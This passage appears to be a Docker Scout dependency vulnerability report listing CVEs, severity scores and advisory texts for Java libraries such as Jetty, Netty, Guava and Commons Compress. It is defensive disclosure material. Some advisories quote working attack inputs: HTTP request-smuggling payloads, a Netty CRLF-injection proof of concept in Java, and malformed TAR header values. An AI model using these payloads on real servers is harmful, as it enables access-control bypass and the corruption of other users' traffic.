</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>ch.qos.logback/logback-classic</strong> <code>1.2.10</code> (maven)</summary>

<small><code>pkg:maven/ch.qos.logback/logback-classic@1.2.10</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-6378?s=github&n=logback-classic&ns=ch.qos.logback&t=maven&vr=%3C1.2.13"><img alt="high 7.1: CVE--2023--6378" src="https://img.shields.io/badge/CVE--2023--6378-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Deserialization of Untrusted Data</i>

<table>
<tr><td>Affected range</td><td><code><1.2.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.13</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.613%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A serialization vulnerability in logback receiver component part of logback allows an attacker to mount a Denial-Of-Service attack by sending poisoned data.

This is only exploitable if logback receiver component is deployed. See https://logback.qos.ch/manual/receivers.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.jboss.xnio/xnio-api</strong> <code>3.8.8.Final</code> (maven)</summary>

<small><code>pkg:maven/org.jboss.xnio/xnio-api@3.8.8.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-5685?s=github&n=xnio-api&ns=org.jboss.xnio&t=maven&vr=%3C%3D3.8.13.Final"><img alt="high 7.5: CVE--2023--5685" src="https://img.shields.io/badge/CVE--2023--5685-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><=3.8.13.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>3.8.14.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.474%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in XNIO. The XNIO NotifierState that can cause a Stack Overflow Exception when the chain of notifier states becomes problematically large can lead to uncontrolled resource management and a possible denial of service (DoS). Version 3.8.14.Final is expected to contain a fix.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>commons-beanutils/commons-beanutils</strong> <code>1.9.4</code> (maven)</summary>

<small><code>pkg:maven/commons-beanutils/commons-beanutils@1.9.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-48734?s=github&n=commons-beanutils&ns=commons-beanutils&t=maven&vr=%3E%3D1.0%2C%3C%3D1.10.1"><img alt="high 8.8: CVE--2025--48734" src="https://img.shields.io/badge/CVE--2025--48734-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Access Control</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0<br/><=1.10.1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.11.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.077%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Improper Access Control vulnerability in Apache Commons.



A special BeanIntrospector class was added in version 1.9.2. This can be used to stop attackers from using the declared class property of Java enum objects to get access to the classloader. However this protection was not enabled by default. PropertyUtilsBean (and consequently BeanUtilsBean) now disallows declared class level property access by default.





Releases 1.11.0 and 2.0.0-M2 address a potential security issue when accessing enum properties in an uncontrolled way. If an application using Commons BeanUtils passes property paths from an external source directly to the getProperty() method of PropertyUtilsBean, an attacker can access the enum’s class loader via the “declaredClass” property available on all Java “enum” objects. Accessing the enum’s “declaredClass” allows remote attackers to access the ClassLoader and execute arbitrary code. The same issue exists with PropertyUtilsBean.getNestedProperty().
Starting in versions 1.11.0 and 2.0.0-M2 a special BeanIntrospector suppresses the “declaredClass” property. Note that this new BeanIntrospector is enabled by default, but you can disable it to regain the old behavior; see section 2.5 of the user's guide and the unit tests.

This issue affects Apache Commons BeanUtils 1.x before 1.11.0, and 2.x before 2.0.0-M2.Users of the artifact commons-beanutils:commons-beanutils

 1.x are recommended to upgrade to version 1.11.0, which fixes the issue.


Users of the artifact org.apache.commons:commons-beanutils2

 2.x are recommended to upgrade to version 2.0.0-M2, which fixes the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.commons/commons-compress</strong> <code>1.23.0</code> (maven)</summary>

<small><code>pkg:maven/org.apache.commons/commons-compress@1.23.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-26308?s=github&n=commons-compress&ns=org.apache.commons&t=maven&vr=%3E%3D1.21%2C%3C1.26.0"><img alt="medium 6.7: CVE--2024--26308" src="https://img.shields.io/badge/CVE--2024--26308-lightgrey?label=medium%206.7&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>>=1.21<br/><1.26.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.448%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Allocation of Resources Without Limits or Throttling vulnerability in Apache Commons Compress. This issue affects Apache Commons Compress: from 1.21 before 1.26.

Users are recommended to upgrade to version 1.26, which fixes the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-25710?s=github&n=commons-compress&ns=org.apache.commons&t=maven&vr=%3E%3D1.3%2C%3C1.26.0"><img alt="medium 5.9: CVE--2024--25710" src="https://img.shields.io/badge/CVE--2024--25710-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code>>=1.3<br/><1.26.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Loop with Unreachable Exit Condition ('Infinite Loop') vulnerability in Apache Commons Compress. This issue affects Apache Commons Compress: from 1.3 through 1.25.0.

Users are recommended to upgrade to version 1.26.0 which fixes the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-42503?s=github&n=commons-compress&ns=org.apache.commons&t=maven&vr=%3E%3D1.22%2C%3C1.24.0"><img alt="medium 5.5: CVE--2023--42503" src="https://img.shields.io/badge/CVE--2023--42503-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code>>=1.22<br/><1.24.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Improper Input Validation, Uncontrolled Resource Consumption vulnerability in Apache Commons Compress in TAR parsing.This issue affects Apache Commons Compress: from 1.22 before 1.24.0.

Users are recommended to upgrade to version 1.24.0, which fixes the issue.

A third party can create a malformed TAR file by manipulating file modification times headers, which when parsed with Apache Commons Compress, will cause a denial of service issue via CPU consumption.

In version 1.22 of Apache Commons Compress, support was added for file modification times with higher precision (issue # COMPRESS-612 [1]). The format for the PAX extended headers carrying this data consists of two numbers separated by a period [2], indicating seconds and subsecond precision (for example “1647221103.5998539”). The impacted fields are “atime”, “ctime”, “mtime” and “LIBARCHIVE.creationtime”. No input validation is performed prior to the parsing of header values.

Parsing of these numbers uses the BigDecimal [3] class from the JDK which has a publicly known algorithmic complexity issue when doing operations on large numbers, causing denial of service (see issue # JDK-6560193 [4]). A third party can manipulate file time headers in a TAR file by placing a number with a very long fraction (300,000 digits) or a number with exponent notation (such as “9e9999999”) within a file modification time header, and the parsing of files with these headers will take hours instead of seconds, leading to a denial of service via exhaustion of CPU resources. This issue is similar to CVE-2012-2098 [5].

[1]:  https://issues.apache.org/jira/browse/COMPRESS-612 
[2]:  https://pubs.opengroup.org/onlinepubs/9699919799/utilities/pax.html#tag_20_92_13_05 
[3]:  https://docs.oracle.com/javase/8/docs/api/java/math/BigDecimal.html 
[4]:  https://bugs.openjdk.org/browse/JDK-6560193 
[5]:  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2098 

Only applications using CompressorStreamFactory class (with auto-detection of file types), TarArchiveInputStream and TarFile classes to parse TAR files are impacted. Since this code was introduced in v1.22, only that version and later versions are impacted.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-webapp</strong> <code>9.4.51.v20230217</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-webapp@9.4.51.v20230217</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-40167?s=gitlab&n=jetty-webapp&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.0.0%2C%3C9.4.52"><img alt="medium 5.3: CVE--2023--40167" src="https://img.shields.io/badge/CVE--2023--40167-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.4.52</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.52.v20230823, 10.0.16, 11.0.16</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>5.222%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Jetty accepts the '+' character proceeding the content-length value in a HTTP/1 header field. This is more permissive than allowed by the RFC and other servers routinely reject such requests with 400 responses. There is no known exploit scenario, but it is conceivable that request smuggling could result if jetty is used in combination with a server that does not close the connection after sending such a 400 response.

### Workarounds

There is no workaround as there is no known exploit scenario. 

### Original Report 

[RFC 9110 Secion 8.6](https://www.rfc-editor.org/rfc/rfc9110#section-8.6) defined the value of Content-Length header should be a string of 0-9 digits. However we found that Jetty accepts "+" prefixed Content-Length, which could lead to potential HTTP request smuggling.

Payload:

```
 POST / HTTP/1.1
 Host: a.com
 Content-Length: +16
 Connection: close
 ​
 0123456789abcdef
```

When sending this payload to Jetty, it can successfully parse and identify the length.

When sending this payload to NGINX, Apache HTTPd or other HTTP servers/parsers, they will return 400 bad request.

This behavior can lead to HTTP request smuggling and can be leveraged to bypass WAF or IDS.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-41900?s=gitlab&n=jetty-webapp&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.4.21%2C%3C9.4.52"><img alt="medium 4.3: CVE--2023--41900" src="https://img.shields.io/badge/CVE--2023--41900-lightgrey?label=medium%204.3&labelColor=fbb552"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>>=9.4.21<br/><9.4.52</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.52.v20230823, 10.0.16, 11.0.16</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If a Jetty `OpenIdAuthenticator` uses the optional nested `LoginService`, and that `LoginService` decides to revoke an already authenticated user, then the current request will still treat the user as authenticated. The authentication is then cleared from the session and subsequent requests will not be treated as authenticated.

So a request on a previously authenticated session could be allowed to bypass authentication after it had been rejected by the `LoginService`.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-36479?s=gitlab&n=jetty-webapp&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.0.0%2C%3C9.4.52"><img alt="low 3.5: CVE--2023--36479" src="https://img.shields.io/badge/CVE--2023--36479-lightgrey?label=low%203.5&labelColor=fce1a9"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.4.52</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.52.v20230823, 10.0.16, 11.0.16</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.383%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If a user sends a request to a `org.eclipse.jetty.servlets.CGI` Servlet for a binary with a space in its name, the servlet will escape the command by wrapping it in quotation marks. This wrapped command, plus an optional command prefix, will then be executed through a call to Runtime.exec. If the original binary name provided by the user contains a quotation mark followed by a space, the resulting command line will contain multiple tokens instead of one. For example, if a request references a binary called file” name “here, the escaping algorithm will generate the command line string “file” name “here”, which will invoke the binary named file, not the one that the user requested.

```java
if (execCmd.length() > 0 && execCmd.charAt(0) != '"' && execCmd.contains(" "))
execCmd = "\"" + execCmd + "\"";
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>com.google.guava/guava</strong> <code>14.0.1</code> (maven)</summary>

<small><code>pkg:maven/com.google.guava/guava@14.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2018-10237?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3E%3D11.0%2C%3C24.1.1-android"><img alt="medium 5.9: CVE--2018--10237" src="https://img.shields.io/badge/CVE--2018--10237-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Deserialization of Untrusted Data</i>

<table>
<tr><td>Affected range</td><td><code>>=11.0<br/><24.1.1-android</code></td></tr>
<tr><td>Fixed version</td><td><code>24.1.1-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.259%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>87th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Unbounded memory allocation in Google Guava 11.0 through 24.x before 24.1.1 allows remote attackers to conduct denial of service attacks against servers that depend on this library and deserialize attacker-provided data, because the AtomicDoubleArray class (when serialized with Java serialization) and the CompoundOrdering class (when serialized with GWT serialization) perform eager allocation without appropriate checks on what a client has sent and whether the data size is reasonable.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-2976?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3E%3D1.0%2C%3C32.0.0-android"><img alt="medium 5.5: CVE--2023--2976" src="https://img.shields.io/badge/CVE--2023--2976-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Creation of Temporary File in Directory with Insecure Permissions</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0<br/><32.0.0-android</code></td></tr>
<tr><td>Fixed version</td><td><code>32.0.0-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.079%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Use of Java's default temporary directory for file creation in `FileBackedOutputStream` in Google Guava versions 1.0 to 31.1 on Unix systems and Android Ice Cream Sandwich allows other users and apps on the machine with access to the default Java temporary directory to be able to access the files created by the class.

Even though the security vulnerability is fixed in version 32.0.0, maintainers recommend using version 32.0.1 as version 32.0.0 breaks some functionality under Windows.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-8908?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3C32.0.0-android"><img alt="low 3.3: CVE--2020--8908" src="https://img.shields.io/badge/CVE--2020--8908-lightgrey?label=low%203.3&labelColor=fce1a9"/></a> <i>Improper Handling of Alternate Encoding</i>

<table>
<tr><td>Affected range</td><td><code><32.0.0-android</code></td></tr>
<tr><td>Fixed version</td><td><code>32.0.0-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A temp directory creation vulnerability exists in Guava prior to version 32.0.0 allowing an attacker with access to the machine to potentially access data in a temporary directory created by the Guava `com.google.common.io.Files.createTempDir()`. The permissions granted to the directory created default to the standard unix-like /tmp ones, leaving the files open. Maintainers recommend explicitly changing the permissions after the creation of the directory, or removing uses of the vulnerable method.


</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>io.netty/netty-codec-http</strong> <code>4.1.96.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty-codec-http@4.1.96.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-67735?s=github&n=netty-codec-http&ns=io.netty&t=maven&vr=%3C4.1.129.Final"><img alt="medium 6.5: CVE--2025--67735" src="https://img.shields.io/badge/CVE--2025--67735-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Improper Neutralization of CRLF Sequences ('CRLF Injection')</i>

<table>
<tr><td>Affected range</td><td><code><4.1.129.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.129.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The `io.netty.handler.codec.http.HttpRequestEncoder` CRLF injection with the request uri when constructing a request. This leads to request smuggling when `HttpRequestEncoder` is used without proper sanitization of the uri.

### Details

The `HttpRequestEncoder` simply UTF8 encodes the `uri` without sanitization (`buf.writeByte(SP).writeCharSequence(uriCharSequence, CharsetUtil.UTF_8);`)

The default implementation of HTTP headers guards against such possibility already with a validator making it impossible with headers.

### PoC

Simple reproducer:

```java
public static void main(String[] args) {

  EmbeddedChannel client = new EmbeddedChannel();
  client.pipeline().addLast(new HttpClientCodec());

  EmbeddedChannel server = new EmbeddedChannel();
  server.pipeline().addLast(new HttpServerCodec());
  server.pipeline().addLast(new ChannelInboundHandlerAdapter() {
    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
      System.out.println("Processing msg " + msg);
    }
  });

  DefaultHttpRequest request = new DefaultHttpRequest(
    HttpVersion.HTTP_1_1,
    HttpMethod.GET,
    "/s1 HTTP/1.1\r\n" +
      "\r\n" +
      "POST /s2 HTTP/1.1\r\n" +
      "content-length: 11\r\n\r\n" +
      "Hello World" +
      "GET /s1"
  );
  client.writeAndFlush(request);
  ByteBuf tmp;
  while ((tmp = client.readOutbound()) != null) {
    server.writeInbound(tmp);
  }
}
```

### Impact

Any application / framework using `HttpRequestEncoder` can be subject to be abused to perform request smuggling using CRLF injection.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-29025?s=github&n=netty-codec-http&ns=io.netty&t=maven&vr=%3C4.1.108.Final"><img alt="medium 5.3: CVE--2024--29025" src="https://img.shields.io/badge/CVE--2024--29025-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><4.1.108.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.108.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.261%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The `HttpPostRequestDecoder` can be tricked to accumulate data. I have spotted currently two attack vectors 

### Details
1. While the decoder can store items on the disk if configured so, there are no limits to the number of fields the form can have, an attacher can send a chunked post consisting of many small fields that will be accumulated in the `bodyListHttpData` list.
2. The decoder cumulates bytes in the `undecodedChunk` buffer until it can decode a field, this field can cumulate data without limits

### PoC

Here is a Netty branch that provides a fix + tests : https://github.com/vietj/netty/tree/post-request-decoder


Here is a reproducer with Vert.x (which uses this decoder) https://gist.github.com/vietj/f558b8ea81ec6505f1e9a6ca283c9ae3

### Impact
Any Netty based HTTP server that uses the `HttpPostRequestDecoder` to decode a form.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58056?s=github&n=netty-codec-http&ns=io.netty&t=maven&vr=%3C4.1.125.Final"><img alt="low : CVE--2025--58056" src="https://img.shields.io/badge/CVE--2025--58056-lightgrey?label=low%20&labelColor=fce1a9"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><4.1.125.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.125.Final</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary
A flaw in netty's parsing of chunk extensions in HTTP/1.1 messages with chunked encoding can lead to request smuggling issues with some reverse proxies.

## Details
When encountering a newline character (LF) while parsing a chunk extension, netty interprets the newline as the end of the chunk-size line regardless of whether a preceding carriage return (CR) was found. This is in violation of the HTTP 1.1 standard which specifies that the chunk extension is terminated by a CRLF sequence (see the [RFC](https://datatracker.ietf.org/doc/html/rfc9112#name-chunked-transfer-coding)).

This is by itself harmless, but consider an intermediary with a similar parsing flaw: while parsing a chunk extension, the intermediary interprets an LF without a preceding CR as simply part of the chunk extension (this is also in violation of the RFC, because whitespace characters are not allowed in chunk extensions). We can use this discrepancy to construct an HTTP request that the intermediary will interpret as one request but netty will interpret as two (all lines ending with CRLF, notice the LFs in the chunk extension):

```
POST /one HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

48;\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n0

POST /two HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0

```

The intermediary will interpret this as a single request. Once forwarded to netty, netty will interpret it as two separate requests. This is a problem, because attackers can then the intermediary, as well as perform standard request smuggling attacks against other live users (see [this Portswigger article](https://portswigger.net/web-security/request-smuggling/exploiting)).

## Impact
This is a request smuggling issue which can be exploited for bypassing front-end access control rules as well as corrupting the responses served to other live clients.

The impact is high, but it only affects setups that use a front-end which:
1. Interprets LF characters (without preceding CR) in chunk extensions as part of the chunk extension.
2. Forwards chunk extensions without normalization.

## Disclosure

 - This vulnerability was disclosed on June 18th, 2025 here: https://w4ke.info/2025/06/18/funky-chunks.html

## Discussion
Discussion for this vulnerability can be found here:
 - https://github.com/netty/netty/issues/15522
 - https://github.com/JLLeitschuh/unCVEed/issues/1

## Credit

 - Credit to @JeppW for uncovering this vulnerability.
 - Credit to @JLLeitschuh at [Socket](https://socket.dev/) for coordinating the vulnerability disclosure.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.commons/commons-configuration2</strong> <code>2.8.0</code> (maven)</summary>

<small><code>pkg:maven/org.apache.commons/commons-configuration2@2.8.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-29133?s=github&n=commons-configuration2&ns=org.apache.commons&t=maven&vr=%3E%3D2.0%2C%3C2.10.1"><img alt="medium 6.9: CVE--2024--29133" src="https://img.shields.io/badge/CVE--2024--29133-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Out-of-bounds Write</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0<br/><2.10.1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.10.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.680%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

This Out-of-bounds Write vulnerability in Apache Commons Configuration affects Apache Commons Configuration: from 2.0 before 2.10.1. User can see this as a 'StackOverflowError' calling 'ListDelimiterHandler.flatten(Object, int)' with a cyclical object tree.
Users are recommended to upgrade to version 2.10.1, which fixes the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-29131?s=github&n=commons-configuration2&ns=org.apache.commons&t=maven&vr=%3E%3D2.0%2C%3C2.10.1"><img alt="medium 6.5: CVE--2024--29131" src="https://img.shields.io/badge/CVE--2024--29131-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Out-of-bounds Write</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0<br/><2.10.1</code></td></tr>
